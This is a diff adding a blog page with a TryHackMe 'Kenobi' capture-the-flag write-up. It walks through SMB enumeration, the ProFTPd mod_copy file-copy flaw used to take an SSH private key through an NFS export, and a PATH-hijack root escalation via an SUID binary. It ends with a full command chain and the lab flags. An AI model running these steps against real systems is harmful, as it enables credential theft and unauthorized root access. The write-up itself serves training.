@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Kenobi | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: anonymous SMB log.txt leak, ProFTPd mod_copy to stage SSH key into NFS export, user flag, SUID /usr/bin/menu PATH hijack to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/kenobi.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/kenobi.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Kenobi">
+<meta property="og:description" content="TryHackMe CTF: anonymous SMB log.txt leak, ProFTPd mod_copy to stage SSH key into NFS export, user flag, SUID /usr/bin/menu PATH hijack to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kenobi">
+<meta name="twitter:description" content="TryHackMe CTF: anonymous SMB log.txt leak, ProFTPd mod_copy to stage SSH key into NFS export, user flag, SUID /usr/bin/menu PATH hijack to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Kenobi</h1>
+    <div class="post-description">TryHackMe CTF. A silent box with an IP address. Anonymous SMB, ProFTPd mod_copy, NFS, and an SUID binary that trusted $PATH a little too much.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>A silent box with an IP address. Let&rsquo;s make it talk.</p>
+
+<hr>
+
+<h2>Recon</h2>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oN kenobi_result.txt</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 7.07.43 AM.png" alt="nmap vuln scan results showing open ports" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>21 FTP</li>
+<li>22 SSH</li>
+<li>80 HTTP</li>
+<li>111 rpcbind</li>
+<li>139 SMB (NetBIOS)</li>
+<li>445 SMB</li>
+<li>2049 NFS</li>
+</ul>
+
+<p>A Samba share on our hands, and an NFS export sitting behind rpcbind. Good start.</p>
+
+<hr>
+
+<h2>What is Samba</h2>
+
+<p>Samba is the standard Windows interoperability suite for Linux and Unix. It lets users access files, printers, and shared resources across a network, often called a network file system. It runs on SMB (Server Message Block). SMB originally rode on port 139 over NetBIOS. Post-Windows 2000 it moved to 445 over TCP.</p>
+
+<hr>
+
+<h2>Enumerating SMB</h2>
+
+<pre><code class="language-bash">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse TARGET_IP</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 7.19.51 AM.png" alt="nmap SMB enumeration showing one share visible" style="max-width:100%;margin:2rem 0;">
+
+<p>Nmap only sees one of the three shares the vuln scan flagged. Let&rsquo;s go deeper.</p>
+
+<pre><code class="language-bash">enum4linux-ng -A TARGET_IP</code></pre>
+
+<p>Then connect anonymously:</p>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/anonymous</code></pre>
+
+<p>Hit enter at the password prompt, and we&rsquo;re in.</p>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 7.38.51 AM.png" alt="smbclient anonymous login to the anonymous share" style="max-width:100%;margin:2rem 0;">
+
+<p>Leave that session open. In a new terminal, pull the share down recursively:</p>
+
+<pre><code class="language-bash">mkdir -p ~/anonymous-share
+cd ~/anonymous-share
+smbclient //TARGET_IP/anonymous -N -c 'prompt off; recurse on; mget *'</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 8.02.41 AM.png" alt="smbclient recursive mget downloading log.txt from the anonymous share" style="max-width:100%;margin:2rem 0;">
+
+<p><code>log.txt</code> is full of information.</p>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 8.35.46 AM.png" alt="log.txt contents revealing user kenobi, ProFTPd on 21, and SSH key path" style="max-width:100%;margin:2rem 0;">
+
+<p>The critical finds:</p>
+
+<pre><code>User: kenobi
+FTP service: ProFTPD
+FTP port: 21
+SMB share path: /home/kenobi/share
+SSH key path created: /home/kenobi/.ssh/id_rsa</code></pre>
+
+<p>So there&rsquo;s an SSH private key on the box, and we know exactly where it lives.</p>
+
+<hr>
+
+<h2>NFS</h2>
+
+<p>The nmap showed port 111 running rpcbind. In this environment, 111 is the access point to the NFS export. Let&rsquo;s enumerate it.</p>
+
+<pre><code class="language-bash">rpcinfo -p TARGET_IP
+showmount -e TARGET_IP</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 9.05.31 AM.png" alt="showmount -e showing /var exported via NFS" style="max-width:100%;margin:2rem 0;">
+
+<p>The <code>/var</code> mount is exported. Hold that thought.</p>
+
+<hr>
+
+<h2>Initial access via ProFTPd</h2>
+
+<p>Grab the FTP banner:</p>
+
+<pre><code class="language-bash">nc TARGET_IP 21</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 9.14.56 AM.png" alt="netcat to port 21 returning ProFTPD version banner" style="max-width:100%;margin:2rem 0;">
+
+<p>Then check it against searchsploit:</p>
+
+<pre><code class="language-bash">searchsploit ProFTPd</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 9.18.19 AM.png" alt="searchsploit results showing four hits for this ProFTPd version including mod_copy" style="max-width:100%;margin:2rem 0;">
+
+<p>Four hits for this version. We&rsquo;ll use the <code>mod_copy</code> exploit.</p>
+
+<p>The TL;DR on mod_copy: it allows server-side file copying via FTP <code>SITE</code> commands, no authentication required.</p>
+
+<pre><code>SITE CPFR /path/to/source       # copy from
+SITE CPTO /path/to/destination  # copy to</code></pre>
+
+<p>From a pentester&rsquo;s chair: if ProFTPd runs with enough permissions, you can copy sensitive files from protected paths into a readable, exported location. We know kenobi&rsquo;s SSH key is at <code>/home/kenobi/.ssh/id_rsa</code>. We know <code>/var</code> is NFS-exported. So we copy the key into <code>/var/tmp</code>, then mount <code>/var</code> and walk off with it.</p>
+
+<pre><code class="language-bash">searchsploit -x linux/remote/36742.txt</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 9.30.32 AM.png" alt="searchsploit exploit detail for ProFTPd mod_copy SITE CPFR and SITE CPTO commands" style="max-width:100%;margin:2rem 0;">
+
+<p>Mount <code>/var</code> and grab the key we copied to <code>/var/tmp</code>:</p>
+
+<pre><code class="language-bash">sudo mkdir -p /mnt/kenobiNFS
+sudo mount -t nfs TARGET_IP:/var /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa ~/kenobi_id_rsa
+chmod 600 ~/kenobi_id_rsa</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 9.37.40 AM.png" alt="NFS mount and cp retrieving id_rsa from /mnt/kenobiNFS/tmp/" style="max-width:100%;margin:2rem 0;">
+
+<p>SSH in as kenobi:</p>
+
+<pre><code class="language-bash">ssh -i ~/kenobi_id_rsa kenobi@TARGET_IP</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 9.39.39 AM.png" alt="SSH login as kenobi succeeding with the stolen key, user flag visible" style="max-width:100%;margin:2rem 0;">
+
+<p>Thanks, kenobi. You just got pwned. User flag: <code>d0b0f3f53b6caa532a83915e19224899</code></p>
+
+<hr>
+
+<h2>Privesc via PATH manipulation</h2>
+
+<p>Quick refresher. SUID means a file executes with the permissions of its owner. If the owner is root, that&rsquo;s a privesc path waiting to happen. The danger shows up when a custom binary carries that same SUID bit.</p>
+
+<p>Search for SUID files owned by root:</p>
+
+<pre><code class="language-bash">find / -perm -u=s -type f 2>/dev/null</code></pre>
+
+<p>Breaking that down:</p>
+
+<pre><code class="language-bash">find /              # search from root
+-perm -u=s          # match files with the owner SUID bit set
+-type f             # regular files only
+2>/dev/null         # hide permission-denied noise</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 9.54.32 AM.png" alt="find SUID results with /usr/bin/menu as the odd duck" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/usr/bin/menu</code> is the odd duck out. Run it:</p>
+
+<pre><code class="language-bash">/usr/bin/menu</code></pre>
+
+<p>It looks like it&rsquo;s calling system commands internally:</p>
+
+<pre><code class="language-bash">system("curl ...");
+system("uname ...");
+system("ifconfig ...");</code></pre>
+
+<p>Linux uses relative command names and searches <code>$PATH</code> to locate them. Since <code>/usr/bin/menu</code> runs as root, we can trick it by planting our own <code>curl</code> earlier in <code>$PATH</code>.</p>
+
+<p>Confirm the binary calls <code>curl</code> (not <code>/usr/bin/curl</code>):</p>
+
+<pre><code class="language-bash">strings /usr/bin/menu</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 10.09.32 AM.png" alt="strings /usr/bin/menu showing curl -I localhost called without an absolute path" style="max-width:100%;margin:2rem 0;">
+
+<p>There it is. It calls <code>curl -I localhost</code>, not the absolute path. That&rsquo;s the whole vulnerability.</p>
+
+<p>Hijack it:</p>
+
+<pre><code class="language-bash">cd /tmp
+echo '/bin/sh' > curl
+chmod +x curl
+export PATH=/tmp:$PATH
+/usr/bin/menu</code></pre>
+
+<p>When the menu appears, pick the option that runs curl (option 1).</p>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 10.19.34 AM.png" alt="/usr/bin/menu presented with the fake curl in /tmp on PATH" style="max-width:100%;margin:2rem 0;">
+
+<p>Enter <code>1</code>, then <code>whoami</code>:</p>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 10.31.20 AM.png" alt="whoami returning root after selecting option 1 from the menu" style="max-width:100%;margin:2rem 0;">
+
+<p>Welcome to the root shell. <code>/usr/bin/menu</code> runs as root, asks Linux to find <code>curl</code>, Linux checks <code>/tmp</code> first, finds our fake one, and runs <code>/bin/sh</code> with root privileges.</p>
+
+<pre><code class="language-bash">cat /root/root.txt</code></pre>
+
+<img src="/images/kenobi/Screenshot 2026-06-01 at 10.32.07 AM.png" alt="root.txt flag 177b3cd8562289f37382721c28381f02" style="max-width:100%;margin:2rem 0;">
+
+<p>Root flag: <code>177b3cd8562289f37382721c28381f02</code></p>
+
+<p>A silent box with an IP address, cracked open through a Samba share, a ProFTPd file-copy bug, an NFS mount, and an SUID binary that trusted <code>$PATH</code> a little too much.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP -oN kenobi_result.txt
+# 21 FTP, 22 SSH, 80 HTTP, 111 rpcbind, 139/445 SMB, 2049 NFS
+
+# 2. Anonymous SMB, pull the share, read log.txt
+smbclient //TARGET_IP/anonymous -N -c 'prompt off; recurse on; mget *'
+# log.txt leaks: user kenobi, ProFTPd on 21, SSH key at /home/kenobi/.ssh/id_rsa
+
+# 3. NFS recon: /var is exported
+showmount -e TARGET_IP
+
+# 4. ProFTPd mod_copy: copy the SSH key into the exported /var
+#    SITE CPFR /home/kenobi/.ssh/id_rsa
+#    SITE CPTO /var/tmp/id_rsa
+
+# 5. Mount /var, steal the key, SSH in -> user flag
+sudo mount -t nfs TARGET_IP:/var /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa ~/kenobi_id_rsa
+chmod 600 ~/kenobi_id_rsa
+ssh -i ~/kenobi_id_rsa kenobi@TARGET_IP
+cat user.txt
+
+# 6. Privesc: SUID /usr/bin/menu calls curl via relative PATH
+find / -perm -u=s -type f 2>/dev/null
+strings /usr/bin/menu        # confirms "curl" not "/usr/bin/curl"
+cd /tmp
+echo '/bin/sh' > curl
+chmod +x curl
+export PATH=/tmp:$PATH
+/usr/bin/menu                # pick option 1 -> root shell
+cat /root/root.txt</code></pre>
+
+<p>Recap: anonymous SMB, log.txt leak, NFS export, ProFTPd mod_copy to steal the SSH key, user flag, SUID PATH hijack on /usr/bin/menu, root flag.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
